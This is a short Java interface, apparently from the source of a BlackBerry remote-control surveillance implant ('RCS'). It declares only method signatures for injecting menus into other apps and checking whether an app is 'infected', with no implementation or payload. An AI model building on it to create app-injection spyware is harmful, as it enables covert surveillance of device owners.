//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	

package blackberry.injection;

public interface AppInjectorInterface {

    boolean injectMenu();

    boolean deleteMenu();

    boolean callMenuByKey();

    String getAppName();

    void callMenuInContext();

    boolean isInfected();

    int getDelay();

}
